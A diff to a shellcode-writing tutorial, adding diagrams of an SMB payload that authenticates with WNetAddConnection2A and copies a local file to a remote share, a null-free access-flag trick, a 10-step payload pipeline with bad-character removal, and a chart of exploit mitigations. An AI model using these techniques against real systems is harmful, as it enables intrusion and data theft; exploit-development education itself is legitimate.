stroke="#a6e3a1" stroke-width="2"/><text x="375" y="170" text-anchor="middle" fill="#a6e3a1" font-family="Consolas,monospace" font-size="11">ExitProcess(0) -- Clean shutdown</text><text x="375" y="220" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" font-style="italic">Each arrow = stdcall: push args right-to-left, call, callee cleans stack</text></svg></div>
+<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<rect width="750" height="300" rx="8" fill="#1e1e2e"/>
+<text x="375" y="28" fill="#cdd6f4" font-size="15" text-anchor="middle" font-weight="bold">NETRESOURCEA Struct (32 bytes on stack)</text>
+<!-- Struct fields -->
+<rect x="80" y="50" width="260" height="30" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="90" y="70" fill="#89b4fa" font-size="11">+0x00  dwScope</text>
+<text x="300" y="70" fill="#6c7086" font-size="10" text-anchor="end">= 0</text>
+<rect x="80" y="84" width="260" height="30" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+<text x="90" y="104" fill="#f38ba8" font-size="11" font-weight="bold">+0x04  dwType</text>
+<text x="300" y="104" fill="#f38ba8" font-size="10" text-anchor="end">= 1 (DISK)</text>
+<rect x="80" y="118" width="260" height="30" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="90" y="138" fill="#89b4fa" font-size="11">+0x08  dwDisplayType</text>
+<text x="300" y="138" fill="#6c7086" font-size="10" text-anchor="end">= 0</text>
+<rect x="80" y="152" width="260" height="30" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="90" y="172" fill="#89b4fa" font-size="11">+0x0C  dwUsage</text>
+<text x="300" y="172" fill="#6c7086" font-size="10" text-anchor="end">= 0</text>
+<rect x="80" y="186" width="260" height="30" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="90" y="206" fill="#89b4fa" font-size="11">+0x10  lpLocalName</text>
+<text x="300" y="206" fill="#6c7086" font-size="10" text-anchor="end">= NULL</text>
+<rect x="80" y="220" width="260" height="30" rx="4" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="90" y="240" fill="#a6e3a1" font-size="11" font-weight="bold">+0x14  lpRemoteName</text>
+<text x="300" y="240" fill="#a6e3a1" font-size="10" text-anchor="end">--> UNC ptr</text>
+<!-- UNC string -->
+<line x1="340" y1="235" x2="420" y2="235" stroke="#a6e3a1" stroke-width="1.5" stroke-dasharray="4,3"/>
+<rect x="420" y="220" width="280" height="30" rx="4" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+<text x="560" y="240" fill="#a6e3a1" font-size="11" text-anchor="middle">\\192.168.1.1\share</text>
+<rect x="80" y="254" width="260" height="30" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+<text x="90" y="274" fill="#89b4fa" font-size="11">+0x18  lpComment</text>
+<text x="300" y="274" fill="#6c7086" font-size="10" text-anchor="end">= NULL</text>
+<rect x="420" y="50" width="280" height="55" rx="6" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
+<text x="560" y="70" fill="#fab387" font-size="11" text-anchor="middle" font-weight="bold">WNetAddConnection2A args:</text>
+<text x="560" y="90" fill="#cdd6f4" font-size="10" text-anchor="middle">(&nr, "password", "user", 0)</text>
+</svg></div>
+
+*Figure 18.2 - The NETRESOURCEA struct layout. Only dwType and lpRemoteName need non-zero values for SMB authentication.*
+
+Then authenticate with `WNetAddConnection2A` and copy with `CopyFileA`.
+
+<div align="center"><svg width="750" height="240" viewBox="0 0 750 240" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<defs><marker id="ah18" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs>
+<rect width="750" height="240" rx="8" fill="#1e1e2e"/>
+<text x="375" y="30" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">SMB File Copy Sequence</text>
+<rect x="30" y="55" width="155" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="107" y="78" text-anchor="middle" fill="#cdd6f4" font-size="11">LoadLibraryA</text>
+<text x="107" y="95" text-anchor="middle" fill="#fab387" font-size="10">("mpr.dll")</text>
+<line x1="185" y1="82" x2="225" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah18)"/>
+<rect x="230" y="55" width="185" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="322" y="78" text-anchor="middle" fill="#cdd6f4" font-size="11">WNetAddConnection2A</text>
+<text x="322" y="95" text-anchor="middle" fill="#fab387" font-size="10">(&nr, pass, user, 0)</text>
+<line x1="415" y1="82" x2="455" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah18)"/>
+<rect x="460" y="55" width="155" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="537" y="78" text-anchor="middle" fill="#cdd6f4" font-size="11">CopyFileA</text>
+<text x="537" y="95" text-anchor="middle" fill="#fab387" font-size="10">(local, remote, FALSE)</text>
+<rect x="220" y="145" width="310" height="40" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="375" y="170" text-anchor="middle" fill="#a6e3a1" font-size="11">ExitProcess(0) -- Clean shutdown</text>
+<text x="375" y="220" text-anchor="middle" fill="#cdd6f4" font-size="10" font-style="italic">Each arrow = stdcall: push args right-to-left, call, callee cleans stack</text>
+</svg></div>
 
 *Figure 18.1 - SMB file copy sequence: load DLL, authenticate, copy, exit*
 
@@ -1196,6 +2288,8 @@ Three kernel32 APIs: **CreateFileA**, **WriteFile**, **CloseHandle**.
 
 ### Null-Free Access Flag Construction
 
+We need `GENERIC_READ | GENERIC_WRITE` = `0xC0000000`. That value is loaded with nulls, so we use a bit shift.
+
 ```nasm
     xor   ebx, ebx
     mov   bl,  0x03             ; EBX = 0x03
@@ -1203,6 +2297,30 @@ Three kernel32 APIs: **CreateFileA**, **WriteFile**, **CloseHandle**.
 ```
 
 `0x03` shifted left by 30 bits puts the two set bits at positions 30 and 31 -- exactly `GENERIC_READ | GENERIC_WRITE`.
+
+<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<rect width="750" height="220" rx="8" fill="#1e1e2e"/>
+<text x="375" y="28" fill="#cdd6f4" font-size="15" text-anchor="middle" font-weight="bold">Bit-Shift Access Flag Construction</text>
+<!-- Before -->
+<text x="60" y="65" fill="#fab387" font-size="12">Before (0x03):</text>
+<rect x="200" y="50" width="500" height="28" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+<text x="220" y="69" fill="#6c7086" font-size="10">31  30  29  28  27  ...  3   2   1   0</text>
+<rect x="200" y="80" width="500" height="28" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+<text x="220" y="99" fill="#6c7086" font-size="11"> 0   0   0   0   0  ...  0</text>
+<text x="660" y="99" fill="#a6e3a1" font-size="11" font-weight="bold"> 1   1</text>
+<!-- SHL arrow -->
+<text x="375" y="125" fill="#f38ba8" font-size="12" text-anchor="middle" font-weight="bold">SHL 30  (shift left by 30 positions)</text>
+<!-- After -->
+<text x="60" y="158" fill="#a6e3a1" font-size="12">After (0xC0000000):</text>
+<rect x="200" y="143" width="500" height="28" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="220" y="162" fill="#6c7086" font-size="10">31  30  29  28  27  ...  3   2   1   0</text>
+<rect x="200" y="173" width="500" height="28" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="220" y="192" fill="#a6e3a1" font-size="11" font-weight="bold"> 1   1</text>
+<text x="310" y="192" fill="#6c7086" font-size="11">  0   0   0  ...  0   0   0   0</text>
+<text x="280" y="210" fill="#6c7086" font-size="9">GR  GW</text>
+</svg></div>
+
+*Figure 19.2 - The two low bits of 0x03 land at positions 31 (GENERIC_READ) and 30 (GENERIC_WRITE) after a 30-bit left shift, producing 0xC0000000 with no null bytes.*
 
 ### Writing and Closing
 
@@ -1221,7 +2339,23 @@ call_closehandle:
     call  dword ptr [ebp+0x20] ; CloseHandle(hFile)
 ```
 
-<div align="center"><svg width="750" height="200" viewBox="0 0 750 200" xmlns="http://www.w3.org/2000/svg"><defs><marker id="ah19" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><rect width="750" height="200" rx="8" fill="#1e1e2e"/><text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" font-weight="bold">File I/O Sequence</text><rect x="30" y="55" width="180" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="120" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="12">CreateFileA</text><text x="120" y="95" text-anchor="middle" fill="#fab387" font-family="Consolas,monospace" font-size="10">0xC0000000 via shl</text><line x1="210" y1="82" x2="265" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah19)"/><rect x="270" y="55" width="180" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="360" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="12">WriteFile</text><text x="360" y="95" text-anchor="middle" fill="#fab387" font-family="Consolas,monospace" font-size="10">hFile, buf, len</text><line x1="450" y1="82" x2="505" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah19)"/><rect x="510" y="55" width="180" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="600" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="12">CloseHandle</text><text x="600" y="95" text-anchor="middle" fill="#a6e3a1" font-family="Consolas,monospace" font-size="10">Flush + release</text><text x="375" y="150" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11">TerminateProcess(-1, 0) -- clean exit via current process pseudo-handle</text></svg></div>
+<div align="center"><svg width="750" height="200" viewBox="0 0 750 200" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<defs><marker id="ah19" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs>
+<rect width="750" height="200" rx="8" fill="#1e1e2e"/>
+<text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">File I/O Sequence</text>
+<rect x="30" y="55" width="180" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="120" y="78" text-anchor="middle" fill="#cdd6f4" font-size="12">CreateFileA</text>
+<text x="120" y="95" text-anchor="middle" fill="#fab387" font-size="10">0xC0000000 via shl</text>
+<line x1="210" y1="82" x2="265" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah19)"/>
+<rect x="270" y="55" width="180" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="360" y="78" text-anchor="middle" fill="#cdd6f4" font-size="12">WriteFile</text>
+<text x="360" y="95" text-anchor="middle" fill="#fab387" font-size="10">hFile, buf, len</text>
+<line x1="450" y1="82" x2="505" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah19)"/>
+<rect x="510" y="55" width="180" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="600" y="78" text-anchor="middle" fill="#cdd6f4" font-size="12">CloseHandle</text>
+<text x="600" y="95" text-anchor="middle" fill="#a6e3a1" font-size="10">Flush + release</text>
+<text x="375" y="150" text-anchor="middle" fill="#cdd6f4" font-size="11">TerminateProcess(-1, 0) -- clean exit via current process pseudo-handle</text>
+</svg></div>
 
 *Figure 19.1 - File I/O: create, write, close, terminate*
 
@@ -1251,6 +2385,66 @@ Here is the end-to-end recipe for building any new shellcode payload from scratc
 
 **Step 10 -- Iterate.** Fix, reassemble, retest. Each cycle gets faster as your pattern library grows.
 
+<div align="center"><svg viewBox="0 0 750 440" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<defs>
+  <marker id="ah20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker>
+  <marker id="ah20d" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#89b4fa"/></marker>
+</defs>
+<rect width="750" height="440" rx="8" fill="#1e1e2e"/>
+<text x="375" y="28" fill="#cdd6f4" font-size="15" text-anchor="middle" font-weight="bold">Shellcode Development Pipeline</text>
+<!-- Row 1 -->
+<rect x="30" y="50" width="140" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="100" y="72" fill="#89b4fa" font-size="11" text-anchor="middle" font-weight="bold">1. Identify APIs</text>
+<text x="100" y="92" fill="#cdd6f4" font-size="9" text-anchor="middle">C pseudocode first</text>
+<line x1="170" y1="77" x2="195" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah20)"/>
+<rect x="200" y="50" width="140" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="270" y="72" fill="#89b4fa" font-size="11" text-anchor="middle" font-weight="bold">2. Hash Names</text>
+<text x="270" y="92" fill="#cdd6f4" font-size="9" text-anchor="middle">ROR-13 script</text>
+<line x1="340" y1="77" x2="365" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah20)"/>
+<rect x="370" y="50" width="150" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="445" y="72" fill="#89b4fa" font-size="11" text-anchor="middle" font-weight="bold">3. Skeleton</text>
+<text x="445" y="92" fill="#cdd6f4" font-size="9" text-anchor="middle">EBP + stack + PEB</text>
+<line x1="520" y1="77" x2="545" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah20)"/>
+<rect x="550" y="50" width="170" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="635" y="72" fill="#89b4fa" font-size="11" text-anchor="middle" font-weight="bold">4. Resolve APIs</text>
+<text x="635" y="92" fill="#cdd6f4" font-size="9" text-anchor="middle">push hash, call, store</text>
+<!-- Row 2 -->
+<line x1="635" y1="105" x2="635" y2="130" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah20)"/>
+<rect x="550" y="135" width="170" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+<text x="635" y="157" fill="#89b4fa" font-size="11" text-anchor="middle" font-weight="bold">5. Load DLLs</text>
+<text x="635" y="177" fill="#cdd6f4" font-size="9" text-anchor="middle">LoadLibraryA + resolve</text>
+<line x1="550" y1="162" x2="505" y2="162" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah20)"/>
+<rect x="340" y="135" width="160" height="55" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+<text x="420" y="157" fill="#f38ba8" font-size="11" text-anchor="middle" font-weight="bold">6. Payload Logic</text>
+<text x="420" y="177" fill="#cdd6f4" font-size="9" text-anchor="middle">Strings, structs, calls</text>
+<line x1="340" y1="162" x2="295" y2="162" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah20)"/>
+<rect x="130" y="135" width="160" height="55" rx="6" fill="#313244" stroke="#fab387" stroke-width="2"/>
+<text x="210" y="157" fill="#fab387" font-size="11" text-anchor="middle" font-weight="bold">7. Kill Bad Chars</text>
+<text x="210" y="177" fill="#cdd6f4" font-size="9" text-anchor="middle">XOR/NOT/SHL/NEG</text>
+<!-- Row 3 -->
+<line x1="210" y1="190" x2="210" y2="220" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah20)"/>
+<rect x="130" y="225" width="160" height="55" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="210" y="247" fill="#a6e3a1" font-size="11" text-anchor="middle" font-weight="bold">8. Assemble + Test</text>
+<text x="210" y="267" fill="#cdd6f4" font-size="9" text-anchor="middle">Keystone + ctypes</text>
+<line x1="290" y1="252" x2="350" y2="252" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah20)"/>
+<rect x="355" y="225" width="160" height="55" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+<text x="435" y="247" fill="#a6e3a1" font-size="11" text-anchor="middle" font-weight="bold">9. Debug</text>
+<text x="435" y="267" fill="#cdd6f4" font-size="9" text-anchor="middle">WinDbg + int3</text>
+<line x1="515" y1="252" x2="575" y2="252" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah20)"/>
+<rect x="580" y="225" width="140" height="55" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+<text x="650" y="247" fill="#f38ba8" font-size="11" text-anchor="middle" font-weight="bold">10. Iterate</text>
+<text x="650" y="267" fill="#cdd6f4" font-size="9" text-anchor="middle">Fix + retest</text>
+<!-- Loop arrow from 10 back to 7 -->
+<path d="M 650,280 C 650,330 210,330 210,225" fill="none" stroke="#89b4fa" stroke-width="2" stroke-dasharray="8,4" marker-end="url(#ah20d)"/>
+<text x="430" y="325" fill="#89b4fa" font-size="10" text-anchor="middle">Iterate until clean</text>
+<!-- Bottom note -->
+<rect x="150" y="370" width="450" height="50" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+<text x="375" y="392" fill="#cdd6f4" font-size="11" text-anchor="middle">Each cycle takes under a minute once the tooling is set up.</text>
+<text x="375" y="410" fill="#a6e3a1" font-size="10" text-anchor="middle">Build a library of tested blocks to accelerate new payloads.</text>
+</svg></div>
+
+*Figure 20.1 - The 10-step shellcode development pipeline. Steps 7-10 form an inner loop that repeats until all bad characters are eliminated and the payload works correctly.*
+
 > **Pro tip:** Keep a personal library of tested building blocks: `find_kernel32`, `find_function`, string-push sequences for common DLL names, and the ctypes test harness. New payloads become an assembly job rather than a greenfield project.
 
 ---
@@ -1258,6 +2452,35 @@ Here is the end-to-end recipe for building any new shellcode payload from scratc
 ## 21. Mitigations, Ethics, and Closing Thoughts
 
 ### Modern Defenses That Impact Shellcode
+
+Each layer adds a barrier that shellcode must defeat. Understanding these helps both attackers (for authorized testing) and defenders (for building detections).
+
+<div align="center"><svg viewBox="0 0 750 360" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+<rect width="750" height="360" rx="8" fill="#1e1e2e"/>
+<text x="375" y="28" fill="#cdd6f4" font-size="15" text-anchor="middle" font-weight="bold">Defense-in-Depth: Shellcode Mitigation Layers</text>
+<!-- Layer 4 - CET (outermost) -->
+<rect x="60" y="50" width="630" height="280" rx="10" fill="none" stroke="#f38ba8" stroke-width="2.5"/>
+<text x="375" y="72" fill="#f38ba8" font-size="13" text-anchor="middle" font-weight="bold">CET (Control-flow Enforcement Technology)</text>
+<text x="375" y="88" fill="#6c7086" font-size="10" text-anchor="middle">Hardware shadow stack catches return-address overwrites</text>
+<!-- Layer 3 - CFG -->
+<rect x="100" y="98" width="550" height="218" rx="8" fill="none" stroke="#fab387" stroke-width="2"/>
+<text x="375" y="118" fill="#fab387" font-size="13" text-anchor="middle" font-weight="bold">CFG (Control Flow Guard)</text>
+<text x="375" y="134" fill="#6c7086" font-size="10" text-anchor="middle">Validates indirect call targets against a legitimate-function bitmap</text>
+<!-- Layer 2 - ASLR -->
+<rect x="140" y="145" width="470" height="155" rx="7" fill="none" stroke="#a6e3a1" stroke-width="2"/>
+<text x="375" y="165" fill="#a6e3a1" font-size="13" text-anchor="middle" font-weight="bold">ASLR (Address Space Layout Randomization)</text>
+<text x="375" y="181" fill="#6c7086" font-size="10" text-anchor="middle">Randomizes DLL base addresses -- PEB walk bypasses, but initial redirect must adapt</text>
+<!-- Layer 1 - DEP (innermost) -->
+<rect x="180" y="192" width="390" height="90" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2.5"/>
+<text x="375" y="218" fill="#89b4fa" font-size="14" text-anchor="middle" font-weight="bold">DEP (Data Execution Prevention)</text>
+<text x="375" y="238" fill="#cdd6f4" font-size="10" text-anchor="middle">Stack/heap marked NX -- need ROP chain to</text>
+<text x="375" y="254" fill="#cdd6f4" font-size="10" text-anchor="middle">VirtualProtect or VirtualAlloc(RWX) first</text>
+<text x="375" y="275" fill="#f38ba8" font-size="11" text-anchor="middle" font-weight="bold">Shellcode runs HERE (if all layers bypassed)</text>
+<!-- Bottom note -->
+<text x="375" y="345" fill="#cdd6f4" font-size="11" text-anchor="middle">Each layer must be bypassed independently -- defense stacking raises the bar exponentially</text>
+</svg></div>
+
+*Figure 21.1 - Modern defenses form concentric barriers. DEP is the innermost (most common to bypass via ROP), while CET is the newest hardware-level defense.*
 
 **DEP (Data Execution Prevention)** marks stack and heap memory as non-executable. Attackers must first use ROP to call `VirtualProtect` or `VirtualAlloc` to mark memory executable.
 
@@ -1293,54 +2516,39 @@ The CPU is waiting. Go write something.
 
 ## About the Author
 
-<div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
-  <rect width="750" height="320" rx="8" fill="#1e1e2e"/>
-  <text x="375" y="35" text-anchor="middle" fill="#cdd6f4" font-size="16" font-weight="bold">Certifications</text>
-  <rect x="100" y="48" width="550" height="1" rx="1" fill="#313244"/>
+### Certifications
 
-  <!-- Row 1 -->
-  <rect x="55" y="70" width="90" height="36" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
-  <text x="100" y="93" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">CWEE</text>
+| Certification | Full Name | Focus Area |
+|:---:|---|---|
+| **CWEE** | Certified Web Exploitation Expert | Web Application Security |
+| **CPTS** | Certified Penetration Testing Specialist | Penetration Testing |
+| **CWES** | Certified Web Exploitation Specialist | Web Exploitation |
+| **CJCA** | Certified Junior Cybersecurity Analyst | Security Analysis |
+| **CRTM** | Certified Red Team Member | Red Team Operations |
+| **CRTE** | Certified Red Team Expert | Active Directory |
+| **CRTP** | Certified Red Team Professional | AD Exploitation |
+| **CRTO** | Certified Red Team Operator | C2 and Red Teaming |
+| **eWPTX** | eLearnSecurity Web Penetration Tester eXtreme | Advanced Web Testing |
+| **eCPPT** | eLearnSecurity Certified Professional Penetration Tester | Professional Pentesting |
+| **eMAPT** | eLearnSecurity Mobile Application Penetration Tester | Mobile Security |
 
-  <rect x="165" y="70" width="90" height="36" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
-  <text x="210" y="93" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">CPTS</text>
+<div align="center"><svg viewBox="0 0 750 250" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="250" rx="8" fill="#1e1e2e"/>
+  <rect x="100" y="20" width="550" height="1" rx="1" fill="#313244"/>
 
-  <rect x="275" y="70" width="90" height="36" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
-  <text x="320" y="93" text-anchor="middle" fill="#a6e3a1" font-size="12" font-weight="bold">CWES</text>
+  <!-- Farewell message -->
+  <text x="375" y="60" text-anchor="middle" fill="#cdd6f4" font-size="14">Thank you for reading this far.</text>
+  <text x="375" y="85" text-anchor="middle" fill="#cdd6f4" font-size="14">If you made it here, you now have the tools to write</text>
+  <text x="375" y="110" text-anchor="middle" fill="#cdd6f4" font-size="14">any Windows shellcode from scratch.</text>
 
-  <rect x="385" y="70" width="90" height="36" rx="6" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
-  <text x="430" y="93" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">CJCA</text>
+  <rect x="200" y="130" width="350" height="1" rx="1" fill="#313244"/>
 
-  <rect x="495" y="70" width="90" height="36" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
-  <text x="540" y="93" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">CRTM</text>
+  <text x="375" y="165" text-anchor="middle" fill="#a6e3a1" font-size="16" font-weight="bold">Keep learning. Keep building. Stay curious.</text>
 
-  <rect x="605" y="70" width="90" height="36" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
-  <text x="650" y="93" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">CRTE</text>
-
-  <!-- Row 2 -->
-  <rect x="110" y="125" width="90" height="36" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
-  <text x="155" y="148" text-anchor="middle" fill="#a6e3a1" font-size="12" font-weight="bold">CRTP</text>
-
-  <rect x="220" y="125" width="90" height="36" rx="6" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
-  <text x="265" y="148" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">CRTO</text>
-
-  <rect x="330" y="125" width="90" height="36" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
-  <text x="375" y="148" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">eWPTX</text>
-
-  <rect x="440" y="125" width="90" height="36" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
-  <text x="485" y="148" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">eCPPT</text>
-
-  <rect x="550" y="125" width="90" height="36" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
-  <text x="595" y="148" text-anchor="middle" fill="#a6e3a1" font-size="12" font-weight="bold">eMAPT</text>
-
-  <!-- Divider -->
   <rect x="200" y="185" width="350" height="1" rx="1" fill="#313244"/>
 
-  <!-- Message -->
-  <text x="375" y="215" text-anchor="middle" fill="#cdd6f4" font-size="13">Thank you for reading this far. If you made it here, you now have</text>
-  <text x="375" y="238" text-anchor="middle" fill="#cdd6f4" font-size="13">the tools to write any Windows shellcode from scratch.</text>
-  <text x="375" y="268" text-anchor="middle" fill="#a6e3a1" font-size="14" font-weight="bold">Keep learning. Keep building. Stay curious.</text>
-  <text x="375" y="300" text-anchor="middle" fill="#6c7086" font-size="12">-- @Rem01x</text>
+  <text x="375" y="220" text-anchor="middle" fill="#6c7086" font-size="13">-- SadlyRemo</text>
+  <text x="375" y="242" text-anchor="middle" fill="#6c7086" font-size="10">Reverse Engineering and Exploit Development</text>
 </svg></div>
 
-*Written by @Rem01x -- for educational purposes only.*
+*Written by SadlyRemo -- for educational purposes only.*
